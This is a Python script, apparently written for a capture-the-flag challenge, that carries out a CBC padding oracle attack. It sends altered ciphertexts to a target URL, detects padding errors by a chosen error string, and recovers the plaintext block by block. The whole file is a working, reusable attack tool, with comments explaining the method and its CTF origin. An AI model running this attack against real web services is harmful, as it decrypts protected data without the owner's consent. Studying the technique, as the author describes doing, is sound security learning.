#!/bin/python3
import binascii
from textwrap import wrap
import sys, getopt
import requests

# NOTE: This program is only built for a basic challenge. If I ever 
#       experience the need to do a padding oracle attack again I'll 
#       extend this script to be more configurable but I'm not spending 
#       the time on that now.
def main(argv):
	# The `rawUrl` is the URL without the argument e.g. `...?param=`
	rawUrl = ''
	# The cipher that will be cracked. It should be "weird" base64 
	# encoded
	cipher = ''
	blocksize = 16
	# The `falseText` is the text that will appear in the page when the 
	# padding is incorrect (since there are other possible errors that 
	# can occur when the padding is correct. Such as a JSON error...)
	falseText = ''
	
	try:
		opts, args = getopt.getopt(argv, "hu:e:c:b:")
	except getopt.GetoptError:
		print('PadOrAck.py -u <url> -e <errortext> -c <cipher>')
		sys.exit(2)
	
	for opt, arg in opts:
		if opt == '-h':
			print('PadOrAck.py -u <url> -e <errortext> -c <cipher> -b <blocksize>')
			sys.exit()
		elif opt == '-u':
			rawUrl = arg
		elif opt == '-c':
			cipher = arg
		elif opt == '-b':
			blocksize = int(arg)
		elif opt == '-e':
			falseText = arg
	
	if rawUrl == '' or cipher == '' or falseText == '':
		print('PadOrAck.py -u <url> -e <errortext> -c <cipher>')
		sys.exit(2)
	
	doOracleAttack(rawUrl, cipher, blocksize, falseText)

def doOracleAttack(url, cipher, blocksize, falseText):
	rawCipherBytes = decodeWeirdBase64(cipher)
	cipherChunks = [rawCipherBytes[i:i+blocksize] for i in range(0, len(rawCipherBytes), blocksize)]
	resultIntermediaryValues = []
	
	for currentIndex, currentChunk in enumerate(cipherChunks):
		print("Cracking Block {0} - {1}".format(currentIndex, currentChunk.hex()))
		crackedIntermediaryValues = crackBlock(currentChunk, url, falseText)
		
		print("  Block {0} Result: {1}".format(currentIndex, crackedIntermediaryValues.hex()))
		
		resultIntermediaryValues.append(crackedIntermediaryValues)
	
	# NOTE: For this we're making the assumption that the IV is the 
	#       first block. Really, AFAIK it is impossible to crack the 
	#       first block if it isn't the IV (unless they use null IV)
	resultPlainText = ''
	
	for i in range(1, len(cipherChunks)):
		xorResult = xorBytes(resultIntermediaryValues[i], cipherChunks[i - 1])
		resultPlainText = resultPlainText + xorResult.decode()
	
	print("Decrypted Plain Text: ")
	print(resultPlainText)

# NOTE: Assumes both are the same length.
def xorBytes(bytes1, bytes2):
	result = bytearray([0 for i in range(0, len(bytes1))])
	
	for i in range(0, len(result)):
		result[i] = bytes1[i] ^ bytes2[i]
	
	return result

def crackBlock(block, url, falseText):
	blocksize = len(block)
	intermediaryValues = bytearray([0 for i in range(0, blocksize)])
	
	for currentByte in reversed(range(0, blocksize)):
		print("    Cracking Byte {0}".format(currentByte))
		
		currentPaddingValue = blocksize - currentByte
		
		crackBlock = bytearray([i for i in intermediaryValues])
		
		# We need to prep the `crackBlock` to have the intermediary 
		# values capable of resulting in the current padding value.
		for prep in range(currentByte + 1, blocksize):
			crackBlock[prep] = crackBlock[prep] ^ currentPaddingValue
		
		for i in range(0, 256):
			crackBlock[currentByte] = i
			
			testCipher = crackBlock + block
			
			oracleResult = testOracle(url, encodeWeirdBase64(testCipher), falseText)
			
			if oracleResult:
				# We have to store the result in our 
				# `intermediaryValues`. This value is the `crackBlock`
				# value at the current byte xored with the  current 
				# padding.
				intermediaryValues[currentByte] = crackBlock[currentByte] ^ currentPaddingValue
				print("        Found: {0}".format(hex(intermediaryValues[currentByte])))
				break
	
	return intermediaryValues

def testOracle(url, testCipher, falseText):
	response = requests.get(url + testCipher)
	
	return not falseText in response.text

# This is probably a give-away where this script was made to be used, 
# don't tell anyone :) While I'm publishing this to GitHub I'm trying 
# my best to make sure you can't find this in a Google search when 
# doing the CTF challenge I created this for. It took me a few hours 
# to learn _how_ to do this attack which anyone interested in infosec 
# should go through and learn this as well. I hear it is one of the 
# easiest crypto attacks out there. It was fun
def decodeWeirdBase64(weirdBase64):
	return binascii.a2b_base64(weirdBase64.replace('~', '=').replace('!', '/').replace('-', '+'))

def encodeWeirdBase64(bytesToEncode):
	return binascii.b2a_base64(bytesToEncode).decode().replace('=', '~').replace('/', '!').replace('+', '-').replace('\n', '')

if __name__ == "__main__":
   main(sys.argv[1:])
